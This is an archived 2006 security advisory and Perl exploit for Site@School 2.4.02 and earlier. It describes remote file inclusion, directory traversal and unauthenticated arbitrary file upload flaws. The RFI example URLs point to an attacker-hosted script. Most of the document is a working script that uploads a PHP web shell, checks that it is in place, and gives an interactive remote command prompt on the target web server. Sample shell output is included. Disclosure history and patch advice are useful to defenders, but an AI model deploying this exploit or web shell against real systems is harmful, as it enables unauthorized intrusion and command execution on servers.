<html><head><title>Site@School <= 2.4.02 Advisory / Remote File Upload Exploit</title></head><pre># Title: Site@School 2.4.02 and below Multiple remote Command Execution Vulnerabilities
# Vendor: Site@School
# webiste : http://siteatschool.sourceforge.net/ 
# Version : &lt;= 2.4.02
# Severity: Critical 
# Discovered by: Simo64 &lt;simo64_at_morx_org&gt; 
# Exploit writting by: Simo Ben youssef &lt;simo_at_morx_org&gt;  
# Discovered: 05 Aout 2006
# Published : 15 September 2006
# MorX Security Research Team
# http://www.morx.org 
# Original File: http://www.morx.org/school.txt

# Details

# Remote File Inclsuion :

# vulnerable code in starnet/modules/sn_allbum/slideshow.php near line 39 - 46:

# [code]
# ------------------------------------------------------------------
# if(file_exists(&quot;$cmsdir/languages/$language/sn_allbum/$language.php&quot;)) 
# {
# 	  include(&quot;$cmsdir/languages/$language/sn_allbum/$language.php&quot;);
# } 
# else 
# {
#	 include(&quot;$cmsdir/languages/EN/sn_allbum/EN.php&quot;);
# }
# -------------------------------------------------------------------[/code]

# vulnerable code in line 91 :

# [code]
# ----------------------------------------------------------------
#	 include(&quot;$cmsdir/themes/$themelocation/&quot;.$content_parm[0]); 
# ------------------------------------------------------------------[/code]

# $cmsdir is not properly verified ,can be used to include files from remote
# resources witch would allow a remote attacker to execute arbitary command with the # privilege of the webserver

# Note : multiple files are affected !

# Exploit : 

# http://localhost/starnet/modules/sn_allbum/slideshow.php?cmsdir=http://attacker/evilscript.txt?cmd=ls
# http://localhost/starnet/modules/include/include.php?cmsdir=http://attacker/evilscript.txt?cmd=ls
# http://localhost/starnet/themes/editable/main.inc.php?cmsdir=http://attacker/evilscript.txt?cmd=ls


# =======================
# Directory Traversal   :
# =======================

# PoC :

# http://localhost/starnet/editors/htmlarea/popups/images.php?dir=../../

# =======================
# Arbitary File Upload  :
# =======================

# vulnerable code in starnet/editors/htmlarea/popups/images.php near lines 58 - 104

# [code]
# ----------------------------------------------------------
# $BASE_DIR = $server_path;
# $BASE_ROOT = $user_path.'/'.$media ;

# if(isset($_FILES['upload']) &amp;&amp; is_array($_FILES['upload']) &amp;&amp; isset($_POST['dirPath'])) 
# {

#	 $dirPathPost = $_POST['dirPath'];
#	 if(strlen($dirPathPost) &gt; 0) 
#	 {
#		 if(substr($dirPathPost,0,1)=='/') 
#			 $IMG_ROOT .= $dirPathPost;		
#		 else
#			 $IMG_ROOT = $dirPathPost;			
#	 }

#	 if(strrpos($IMG_ROOT, '/')!= strlen($IMG_ROOT)-1) 
#		 $IMG_ROOT .= '/';

#	 do_upload($_FILES['upload'], $BASE_DIR.$BASE_ROOT.$dirPathPost.'/');
# }

# /*[morx] do_upload function code [/morx]*/


# function do_upload($file, $dest_dir) 
# {
# 	global $clearUploads, $perm;

# 	if(is_file($file['tmp_name'])) 
#	 {  
#         # Remove spaces, apostrophe, exclamation marks etc.
#         $str_from = &quot; \'@!,/\\\t\*?`\&quot;&quot; ;
#         $str_to = str_repeat(&quot;_&quot;,strlen($str_from));
#         $file_name = strtr($file['name'],$str_from,$str_to);  
#		 //var_dump($file); echo &quot;DIR:$dest_dir&quot;;
#		 move_uploaded_file($file['tmp_name'], $dest_dir.$file_name);
#	 	 //get filepermissions from config and chmod it.
#		 eval(&quot;chmod('$dest_dir.$file_name', $perm);&quot;);
#	 }

#	 $clearUploads = true;
# }

# ---------------------------------------------------------[/code]

# the first problem is that starnet/editors/htmlarea/popups/images.php is accessible
# directelly to any user without any authentificagtion , 
# the second problem is that the script doesn't verify thefile extension so an attacker needs just to complete the
# condition in line 88 to upload a malicious script

# Disclosure History:

# 05 Aout 2006 : Discovered
# 05 Aout 2006 : Contacted Vendor with vulnerabilities information
# 23 Aout 2006 : Vendor released 2.4.03

# Patch:

# Upgrade to the latest version.

# Exploit :
# =========
# [code]

# C:\&gt;perl school.pl localhost

# --- Site@school remote file upload Xploit
# --- Writting By Simo ben youssef / Simo_at_morx_org
# --- MorX Security Research Team
# --- www.morx.org

# [*] checking if zebi.php was successfully uploaded ...
# [+] zebi.php was successfully uploaded

# ####################################
# ####     ET VOILA, YOU ARE IN  #####
# ####################################

# Linux localhost 2.6.12.6-xenU #1 SMP Sun Dec 4 20:49:44 GMT 2005 x86_64 GNU/Linux

# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# [www-data@localhost:]#exit
# Connection Closed

use IO::Socket;
use LWP::Simple;

if(!defined($ARGV[0])) {

print &quot;\n--- Site\@school remote file upload Xploit\n&quot;;
print &quot;--- Writting By Simo ben youssef / Simo_at_morx_org\n&quot;;
print &quot;--- MorX Security Research Team\n&quot;;
print &quot;--- www.morx.org\n\n&quot;;

print &quot;--- Usage:   perl $0 &lt;host&gt;\n&quot;;
print &quot;--- Example: perl $0 localhost\n\n&quot;;
exit; }

$TARGET = $ARGV[0];
$PORT   = &quot;80&quot;;
$SCRIPT = &quot;starnet/editors/htmlarea/popups/images.php&quot;;
$SHELL  = &quot;/starnet/media/zebi.php?cmd=&quot;;
$HTTP   = &quot;http://&quot;;


$COMMAND1 = &quot;POST /$SCRIPT HTTP/1.1&quot;;
$COMMAND2 = &quot;Accept: image/gif, image/x-xbitmap, image/jpeg,  image/pjpeg, application/x-shockwave-flash, */*&quot;;
$COMMAND3 = &quot;Accept-Language: en-us&quot;;
$COMMAND4 = &quot;Content-Type: multipart/form-data; boundary=-------- -------------------7d62e2819048c2&quot;;
$COMMAND5 = &quot;Accept-Encoding: gzip, deflate&quot;;
$COMMAND6 = &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;  Windows NT 5.1)&quot;;
$COMMAND7 = &quot;Host: $TARGET&quot;;
$COMMAND8 = &quot;Content-Length: 438&quot;;
$COMMAND9 = &quot;Connection: Keep-Alive&quot;;
$COMMAND9a = &quot;Cache-Control: no-cache&quot;;
$COMMAND10 = &quot;-----------------------------7d62e2819048c2&quot;;
$COMMAND11 = 'Content-Disposition: form-data; name=&quot;dirPath&quot;';
$COMMAND12 = &quot;/&quot;;
$COMMAND13 = 'Content-Disposition: form-data; name=&quot;upload&quot;;  filename=&quot;C:\zebi.php&quot;';
$COMMAND14 = &quot;Content-Type: application/octet-stream&quot;;
$COMMAND15 = &quot;&lt;? system(\$_GET['cmd']\);exit; ?&gt;&quot;;
$COMMAND16 = 'Content-Disposition: form-data; name=&quot;upload&quot;';
$COMMAND17 = &quot;Upload&quot;;
$COMMAND18 = &quot;-----------------------------7d62e2819048c2--&quot;;
$COMMAND19 = &quot;HEAD /starnet/media/zebi.php HTTP/1.1&quot;;

$remote = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$TARGET&quot; ,PeerPort=&gt;&quot;$PORT&quot;)
|| die &quot;Can't connect to $TARGET&quot;;

print &quot;\n--- Site\@school remote file upload Xploit\n&quot;;
print &quot;--- Writting By Simo ben youssef / Simo_at_morx_org\n&quot;;
print &quot;--- MorX Security Research Team\n&quot;;
print &quot;--- www.morx.org\n\n&quot;;


print &quot;[*] Trying to upload zebi.php ...\n\n&quot;;

sleep 2;
print $remote &quot;$COMMAND1\n$COMMAND2\n$COMMAND3\n$COMMAND4\n$COMMAND5\n$COMMAND6\n$COMMAND7\n$COMMAND8\n$COMMAND9\n$COMMAND9a\n\n&quot;;

print $remote &quot;$COMMAND10\n$COMMAND11\n\n$COMMAND12\n$COMMAND10\n$COMMAND13\n$COMMAND14\n\n$COMMAND15\n$COMMAND10\n$COMMAND16\n\n$COMMAND17\n$COMMAND18\n\n&quot;;

print &quot;[*] checking if zebi.php was successfully uploaded ...\n&quot;;

print $remote &quot;$COMMAND19\n$COMMAND7\n$COMMAND9\n$COMMAND9a\n\n&quot;;

while ($output = &lt;$remote&gt; ) {
if ($output =~ /200 OK/) {
print &quot;[+] zebi.php was successfully uploaded\n\n&quot;;

$cmd2   = &quot;uname -n&quot;;
$cmd3   = &quot;whoami&quot;;
$cmd4   = &quot;uname -a&quot;;
$cmd5   = &quot;id&quot;;
$unamea = &quot;$HTTP$TARGET$SHELL$cmd4&quot;;
$id     = &quot;$HTTP$TARGET$SHELL$cmd5&quot;;
$uname  = &quot;$HTTP$TARGET$SHELL$cmd2&quot;;
$whoami = &quot;$HTTP$TARGET$SHELL$cmd3&quot;;
$w      = get($whoami);
$u      = get($uname);
chomp($w);
chomp($u);
$ua     = get($unamea);
$i      = get($id);
print &quot;####################################\n&quot;;
print &quot;####     ET VOILA, YOU ARE IN  #####\n&quot;;
print &quot;####################################\n\n&quot;;

print &quot;$ua\n$i&quot;;

while () {

print &quot;\n[$w\@$u:]#&quot;;

chomp($cmd=&lt;STDIN&gt;);
if ($cmd eq &quot;exit&quot;) 
{ 
print &quot;Connection Closed\n&quot;;
$remote-&gt;flush();
close($remote);
exit;
}

$LEHWA   = &quot;$HTTP$TARGET$SHELL$cmd&quot;;

if($cmd eq &quot;&quot;)
{ 
print &quot;empty command ! for help, type help\n&quot;; }
else
{ 
getprint($LEHWA)
}
}
$a = 1
}
}

if ($a == 0)
{ print &quot;[-] failed\n&quot;;
}
$remote-&gt;flush();
close($remote);
exit;

# Disclaimer:

# This entire document is for eductional, testing and demonstrating purpose only.
# Modification use and/or publishing this information is entirely on your OWN risk.
# I cannot be held responsible for any of the above.

# milw0rm.com [2006-09-15]</pre></html>